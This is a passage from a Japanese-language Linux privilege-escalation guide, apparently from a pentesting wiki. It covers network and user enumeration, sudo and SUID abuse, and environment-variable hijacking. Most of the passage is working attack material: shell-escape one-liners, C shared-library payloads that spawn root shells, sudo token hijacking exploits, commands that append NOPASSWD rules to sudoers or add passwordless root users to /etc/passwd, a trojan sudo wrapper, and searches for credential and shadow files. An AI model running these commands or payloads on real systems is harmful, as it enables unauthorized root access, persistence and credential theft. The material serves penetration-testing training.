<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**ここで D-Bus communication を enumerate および exploit する方法を学んでください:**

{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **ネットワーク**

ネットワークを enumerate してマシンの位置を特定するのは常に有益です。

### 一般的な enumeration
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### オープンポート

アクセス前に操作できなかったマシン上で動作しているネットワークサービスは常に確認してください:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

sniff trafficが可能か確認してください。可能であれば、認証情報を取得できるかもしれません。
```
timeout 1 tcpdump
```
## ユーザー

### 一般的な列挙

自分が誰で、どのような権限を持っているか、システムにどのユーザーがいるか、どのユーザーがログインできるか、どのユーザーがroot権限を持っているかを確認してください:
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Big UID

一部のLinuxバージョンは、**UID > INT_MAX** のユーザーが権限昇格できるバグの影響を受けていました。詳しくは: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) and [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**Exploit it** using: **`systemd-run -t /bin/bash`**

### グループ

自分がroot権限を与える可能性のある**いずれかのグループのメンバー**であるか確認してください:


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### クリップボード

可能であれば、クリップボード内に興味深いものがないか確認してください
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### パスワードポリシー
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### 既知のパスワード

環境の **パスワードを知っている場合**、そのパスワードを使って **各ユーザーにログインを試みてください**。

### Su Brute

大量のノイズを出すことを気にせず、かつ `su` と `timeout` バイナリがマシン上に存在する場合は、[su-bruteforce](https://github.com/carlospolop/su-bruteforce) を使ってユーザーをブルートフォースできます。\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) は `-a` パラメータで同様にユーザーのブルートフォースを試みます。

## 書き込み可能な PATH の悪用

### $PATH

もし $PATH のいずれかのフォルダに **書き込み可能である** と分かった場合、書き込み可能なフォルダ内に、別ユーザー（理想は root）によって実行されるコマンド名と同じ名前の **バックドアを作成する** ことで権限昇格できる可能性があります。ただし、そのコマンドが $PATH 中であなたの書き込み可能フォルダより **前に位置するフォルダから読み込まれない** ことが条件です。

### SUDO and SUID

sudo を使って特定のコマンドを実行できるようになっているか、または対象に suid ビットが設定されている可能性があります。確認するには次を使用してください：
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
一部の**予期しないコマンドは、ファイルの読み取りや書き込み、さらにはコマンドの実行を可能にすることがあります。** 例えば：
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Sudo の設定によって、ユーザーがパスワードを知らなくても別ユーザーの権限でコマンドを実行できる場合がある。
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
この例ではユーザー `demo` が `root` として `vim` を実行できます。root directory に ssh key を追加するか、`sh` を実行することで、shell を取得するのは非常に簡単です。
```
sudo vim -c '!sh'
```
### SETENV

このディレクティブは、実行時にユーザーが**環境変数を設定する**ことを許可します:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
この例は、**based on HTB machine Admirer**で、スクリプトをrootとして実行する際に任意のpythonライブラリを読み込むための**PYTHONPATH hijacking**に**vulnerable**でした:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### BASH_ENV が sudo env_keep によって保持される → root shell

If sudoers preserves `BASH_ENV` (e.g., `Defaults env_keep+="ENV BASH_ENV"`), you can leverage Bash’s non-interactive startup behavior to run arbitrary code as root when invoking an allowed command.

- 動作する理由: 非対話シェルでは、Bash は `$BASH_ENV` を評価し、ターゲットスクリプトを実行する前にそのファイルを読み込みます。多くの sudo ルールはスクリプトやシェルラッパーの実行を許可します。もし `BASH_ENV` が sudo によって保持されていれば、あなたのファイルは root 権限で読み込まれます。

- 要件:
- 実行できる sudo ルール（`/bin/bash` を非対話的に呼び出すターゲット、または任意の bash スクリプト）。
- `BASH_ENV` が `env_keep` に含まれていること（`sudo -l` で確認）。

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- Hardening:
- `env_keep`から`BASH_ENV`（および`ENV`）を削除し、`env_reset`を推奨する。
- sudo-allowed commands のための shell wrappers を避け、最小限の binaries を使用する。
- preserved env vars が使用される場合、sudo の I/O ロギングとアラートを検討する。

### Sudo 実行バイパス経路

**Jump** を使って他のファイルを読むか、**symlinks** を使用する。例えば sudoers ファイルでは: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
もし**wildcard**が使われている（\*）と、さらに簡単です：
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**対策**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo コマンド/SUID バイナリ（コマンドパスが指定されていない場合）

単一のコマンドに対して **sudo permission** が与えられ、**パスが指定されていない**場合: _hacker10 ALL= (root) less_、PATH 変数を変更することでこれを悪用できます。
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
この手法は、**suid** バイナリが**パスを指定せずに別のコマンドを実行する場合（変な SUID バイナリの内容は常に_**strings**_で確認してください）**にも使用できます。

[Payload examples to execute.](payloads-to-execute.md)

### SUID バイナリ（コマンドのパスが指定されている場合）

もし**suid** バイナリが**パスを指定して別のコマンドを実行する場合**、suidファイルが呼び出しているコマンド名で**関数をエクスポート**してみてください。

例えば、もし suid バイナリが _**/usr/sbin/service apache2 start**_ を呼び出す場合、その関数を作成してエクスポートしてみます:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
その後、suid バイナリを呼び出すと、この関数が実行されます

### LD_PRELOAD & **LD_LIBRARY_PATH**

The **LD_PRELOAD** 環境変数は、標準 C ライブラリ (`libc.so`) を含む他のすべてよりも先にローダによって読み込まれる、1つ以上の共有ライブラリ（.so files）を指定するために使用されます。このプロセスはライブラリのプリロードとして知られています。

しかし、特に suid/sgid 実行ファイルに対する悪用を防ぎシステムのセキュリティを維持するために、システムはいくつかの条件を強制します:

- ローダは、実ユーザーID (_ruid_) が有効ユーザーID (_euid_) と一致しない実行ファイルに対しては **LD_PRELOAD** を無視します。
- suid/sgid を持つ実行ファイルについては、標準パスにあり、かつ suid/sgid のものだけがプリロードされます。

権限昇格は、`sudo` でコマンドを実行する能力があり、かつ `sudo -l` の出力に **env_keep+=LD_PRELOAD** が含まれている場合に発生する可能性があります。この設定により、`sudo` でコマンドを実行しても **LD_PRELOAD** 環境変数が保持され認識されるようになり、潜在的に任意のコードが昇格した特権で実行される可能性があります。
```
Defaults        env_keep += LD_PRELOAD
```
以下のファイル名で保存: **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
次に、**コンパイルする**には次のコマンドを使用します:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
最後に、 **escalate privileges** を実行して
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> 攻撃者が **LD_LIBRARY_PATH** env variable を制御していると、同様の privesc を悪用できます。これは攻撃者がライブラリの検索パスを制御できるためです。
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

異常に見える**SUID**権限を持つbinaryに遭遇した場合、正しく**.so**ファイルをロードしているか確認するのが良い習慣です。次のコマンドを実行して確認できます:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
例えば、_"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ のようなエラーに遭遇した場合、悪用の可能性があることを示唆します。

これを悪用するには、Cファイル、例えば _"/path/to/.config/libcalc.c"_ を作成し、以下のコードを含めます:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
このコードは、コンパイルして実行すると、ファイルのパーミッションを操作して privileges を昇格させ、昇格した shell を実行することを目的としています。

上記の C ファイルを shared object (.so) ファイルにコンパイルするには、次のコマンドを使用します:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
最後に、影響を受けた SUID バイナリを実行すると exploit がトリガーされ、system compromise を引き起こす可能性があります。

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
SUID binary が書き込み可能な folder から library を読み込むものを見つけたので、その folder に必要な名前で library を作成しましょう:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
次のようなエラーが発生した場合
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
それは、生成したライブラリに `a_function_name` という名前の関数が含まれている必要があることを意味します。

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) は、ローカルのセキュリティ制限を回避するために攻撃者が悪用できる Unix バイナリのキュレートされたリストです。 [**GTFOArgs**](https://gtfoargs.github.io/) は同様のもので、コマンドに対して **引数だけを注入できる** 場合の事例を扱っています。

このプロジェクトは、restricted shell からの脱出、権限昇格や権限維持、ファイル転送、bind/reverse シェルの生成、その他のポストエクスプロイテーション作業を助けるために悪用できる Unix バイナリの正規機能を収集しています。

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

`sudo -l` にアクセスできる場合、ツール [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) を使って、どの sudo ルールを悪用できるかを調べることができます。

### Reusing Sudo Tokens

パスワードは知らないが **sudo access** を持っている場合、sudo コマンドの実行を待ち、そのセッショントークンをハイジャックすることで権限を昇格できます。

権限昇格の要件:

- すでにユーザ "_sampleuser_" としてシェルを持っていること
- "_sampleuser_" は **過去15分以内に `sudo` を使用して** 何かを実行していること（デフォルトではこれが、パスワード入力なしで `sudo` を使える sudo トークンの持続時間です）
- `cat /proc/sys/kernel/yama/ptrace_scope` の値が 0 であること
- `gdb` にアクセスできること（アップロード可能であること）

（`ptrace_scope` を一時的に有効化するには `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` を使うか、または `/etc/sysctl.d/10-ptrace.conf` を恒久的に変更して `kernel.yama.ptrace_scope = 0` に設定します）

これらの要件がすべて満たされている場合、**次を使って権限を昇格できます：** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- The **first exploit** (`exploit.sh`) will create the binary `activate_sudo_token` in _/tmp_. You can use it to **activate the sudo token in your session** (you won't get automatically a root shell, do `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- **2番目の exploit** (`exploit_v2.sh`) は _/tmp_ に **setuid で root が所有する sh shell** を作成します。
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- この **3番目の exploit** (`exploit_v3.sh`) は **sudoers file を作成する** ことで **sudo tokens を永続化し、全ユーザーが sudo を使用できるようにします**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

フォルダやその中で作成されたファイルに**書き込み権限**がある場合、バイナリ [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) を使って **ユーザーと PID 用の sudo トークンを作成** できます。\
例えば、ファイル _/var/run/sudo/ts/sampleuser_ を上書きでき、そのユーザーとして PID 1234 のシェルを持っている場合、パスワードを知らなくても次のようにして **sudo 権限を取得** できます：
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

ファイル `/etc/sudoers` と `/etc/sudoers.d` 内のファイルは、誰が `sudo` を使用できるかとその方法を設定します。これらのファイルは**デフォルトではユーザー root とグループ root のみが読み取り可能です**。\  
**もし**あなたがこのファイルを**読み取る**ことができれば、**興味深い情報を取得できる**可能性があり、もし任意のファイルに**書き込み**できれば**escalate privileges**が可能になります。
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
書き込みができるなら、この権限を悪用できます。
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
これらの権限を悪用する別の方法：
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

`sudo` バイナリの代替として OpenBSD の `doas` などがあります。設定は `/etc/doas.conf` を確認してください。
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

もし**ユーザーが通常マシンに接続して権限昇格に `sudo` を使う**ことが分かっており、そのユーザーコンテキストでシェルを取得している場合、root として自分のコードを実行し、その後ユーザーのコマンドを実行する**新しい sudo 実行ファイルを作成**できます。次に、ユーザーコンテキストの**$PATH を変更**（例: .bash_profile に新しいパスを追加）して、ユーザーが `sudo` を実行したときにあなたの sudo 実行ファイルが実行されるようにします。

ユーザーが別のシェル（bash 以外）を使用している場合は、新しいパスを追加するために別のファイルを修正する必要がある点に注意してください。例えば[ sudo-piggyback](https://github.com/APTy/sudo-piggyback) は `~/.bashrc`, `~/.zshrc`, `~/.bash_profile` を修正します。別の例は [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py) にあります。

または次のようなコマンドを実行する:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## 共有ライブラリ

### ld.so

ファイル `/etc/ld.so.conf` は **どの場所から設定ファイルが読み込まれるか** を示します。通常、このファイルには次のパスが含まれます: `include /etc/ld.so.conf.d/*.conf`

つまり `/etc/ld.so.conf.d/*.conf` の設定ファイルが読み込まれます。これらの設定ファイルは **他のフォルダを指しており**、そこで **ライブラリ** が **検索されます**。例えば、`/etc/ld.so.conf.d/libc.conf` の内容が `/usr/local/lib` であれば、**システムは `/usr/local/lib` 内のライブラリを検索します**。

何らかの理由で `/etc/ld.so.conf`、`/etc/ld.so.conf.d/`、`/etc/ld.so.conf.d/` 内の任意のファイル、または `/etc/ld.so.conf.d/*.conf` 内の設定ファイルが指す任意のフォルダに **ユーザーが書き込み権限を持っている** 場合、escalate privileges が可能になることがあります.\
次のページで **この誤設定をどのように悪用するか** を確認してください:


{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
lib を `/var/tmp/flag15/` にコピーすると、`RPATH` 変数で指定されている通り、その場所でプログラムによって使用されます。
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
次に `/var/tmp` に悪意のあるライブラリを作成します: `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Capabilities

Linux capabilities はプロセスに対して利用可能な **root privileges のサブセットを提供します**。これにより root の権限は効果的に **より小さく識別可能な単位に分割され**、各単位を個別にプロセスへ付与できます。こうして権限の全体集合が削減され、悪用のリスクが低減します.\
以下のページを読んで、**capabilities とそれをどのように悪用するか** について詳しく学んでください：


{{#ref}}
linux-capabilities.md
{{#endref}}

## Directory permissions

ディレクトリでは、**"execute" のビット** は対象のユーザが **"cd"** でフォルダに入れることを意味します.\
**"read"** ビットはユーザが **ファイルを一覧表示** できることを意味し、**"write"** ビットはユーザが **ファイルを削除** および **新規作成** できることを意味します。

## ACLs

Access Control Lists (ACLs) は裁量的権限の二次層を表し、**従来の ugo/rwx permissions を上書きすることができます**。これらの permissions は、所有者でもグループのメンバーでもない特定のユーザに対して権利を許可または拒否することで、ファイルやディレクトリへのアクセス制御を強化します。このレベルの **粒度により、より正確なアクセス管理が可能になります**。詳細は [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux) を参照してください。

**Give** user "kali" read and write permissions over a file:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**取得** システム内の特定の ACL を持つファイル:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## shell セッションを開く

**古いバージョン**では、別のユーザ（**root**）のいくつかの**shell**セッションを**hijack**できる場合があります。\
**最新バージョン**では、**自分のユーザ** の**screen**セッションにしか**接続**できません。ただし、**セッション内の興味深い情報**が見つかることがあります。

### screen sessions hijacking

**screen sessions を一覧表示する**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../images/image (141).png>)

**セッションにアタッチする**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sessions hijacking

これは **old tmux versions** の問題でした。root によって作成された tmux (v2.1) セッションを、非特権ユーザーとして hijack することはできませんでした。

**tmux セッションの一覧**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**セッションに接続する**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
例として **Valentine box from HTB** を確認してください。

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

2006年9月から2008年5月13日までの間に Debian 系システム（Ubuntu、Kubuntu など）で生成されたすべての SSL および SSH キーは、このバグの影響を受ける可能性があります。\
このバグはこれらの OS 上で新しい ssh キーを作成する際に発生し、**可能なバリエーションはわずか 32,768 通りしかなかった**ためです。これは、すべての可能性を計算でき、**ssh public key を持っていれば対応する private key を探すことができる**ことを意味します。計算済みの候補はここで見つけられます: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH の興味深い設定値

- **PasswordAuthentication:** パスワード認証を許可するかどうかを指定します。デフォルトは `no` です。
- **PubkeyAuthentication:** 公開鍵認証を許可するかどうかを指定します。デフォルトは `yes` です。
- **PermitEmptyPasswords**: パスワード認証が許可されている場合、パスワードが空文字のアカウントでのログインをサーバーが許可するかどうかを指定します。デフォルトは `no` です。

### PermitRootLogin

root が ssh を使ってログインできるかどうかを指定します。デフォルトは `no`。可能な値:

- `yes`: root はパスワードおよび private key を使ってログインできます
- `without-password` or `prohibit-password`: root は private key のみでログインできます
- `forced-commands-only`: root は private key を使用し、かつ command オプションが指定されている場合のみログインできます
- `no` : 不可

### AuthorizedKeysFile

ユーザー認証に使用できる public keys を含むファイルを指定します。`%h` のようなトークンを含めることができ、ユーザーのホームディレクトリに置換されます。**絶対パスを指定できます**（`/` で始まる）または**ユーザーのホームからの相対パスを指定できます**。例えば:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
その設定は、ユーザー「**testusername**」の**秘密鍵**でログインしようとした場合、sshがあなたのキーの公開鍵を`/home/testusername/.ssh/authorized_keys`および`/home/testusername/access`にあるものと比較することを示します。

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding により、サーバーに（パスフレーズなしで！）鍵を残す代わりに**ローカルのSSHキーを使用する**ことができます。つまり、sshで**ジャンプ**して**あるホストへ**移動し、そこから**別のホストへジャンプ**し、**使用して**接続するのは**キー**で、その**キー**は**最初のホスト**にあります。

このオプションは`$HOME/.ssh.config`に次のように設定する必要があります:
```
Host example.com
ForwardAgent yes
```
Notice that if `Host` is `*` every time the user jumps to a different machine, that host will be able to access the keys (which is a security issue).

ファイル `/etc/ssh_config` はこの**オプション**を**上書き**してこの設定を許可または拒否できます。\
ファイル `/etc/sshd_config` はキーワード `AllowAgentForwarding` によって ssh-agent forwarding を**許可**または**拒否**できます（デフォルトは許可）。

環境で Forward Agent が設定されていることを確認したら、次のページをお読みください。**権限昇格のために悪用できる可能性があります**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## 興味深いファイル

### プロファイルファイル

ファイル `/etc/profile` と `/etc/profile.d/` 以下のファイルは、**ユーザーが新しいシェルを実行したときに実行されるスクリプト**です。したがって、**それらのいずれかに書き込みまたは変更ができると、権限昇格が可能になります**。
```bash
ls -l /etc/profile /etc/profile.d/
```
もし怪しいプロファイルスクリプトが見つかったら、**機密情報**がないか確認してください。

### Passwd/Shadow Files

OSによっては `/etc/passwd` および `/etc/shadow` ファイルが別名で存在したり、バックアップがある場合があります。したがって、**それらをすべて見つける**ことと、**読み取れるか確認する**ことをおすすめします。ファイル内に**ハッシュが含まれているか**を確認するためです:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
場合によっては、`/etc/passwd`（または同等のファイル）内に**password hashes**が見つかることがあります
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### 書き込み可能な /etc/passwd

まず、次のいずれかのコマンドでパスワードを生成します。
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
次にユーザー `hacker` を追加し、生成されたパスワードを設定してください。
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
例: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

これで `hacker:hacker` を使って `su` コマンドを実行できます。

あるいは、次の行を使用してパスワードなしのダミーユーザーを追加できます。\
警告: マシンの現在のセキュリティが低下する可能性があります。
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
注意: In BSD platforms `/etc/passwd` is located at `/etc/pwd.db` and `/etc/master.passwd`, also the `/etc/shadow` is renamed to `/etc/spwd.db`.

いくつかの**機密ファイルに書き込めるか**確認してください。例えば、いくつかの**サービス設定ファイル**に書き込めますか？
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
例えば、マシンが **tomcat** サーバーを実行していて、**modify the Tomcat service configuration file inside /etc/systemd/,** できるなら、次の行を変更できます:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
### フォルダの確認

次回 tomcat を起動すると、あなたの backdoor が実行されます。

次のフォルダにはバックアップや興味深い情報が含まれている可能性があります: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root**（おそらく最後のものは読み取れないでしょうが、試してみてください）
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### 奇妙な場所/Ownedファイル
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### 過去数分以内に変更されたファイル
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite DB ファイル
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml ファイル
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### 隠しファイル
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **PATH内のScript/Binaries**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Webファイル**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **バックアップ**
```bash
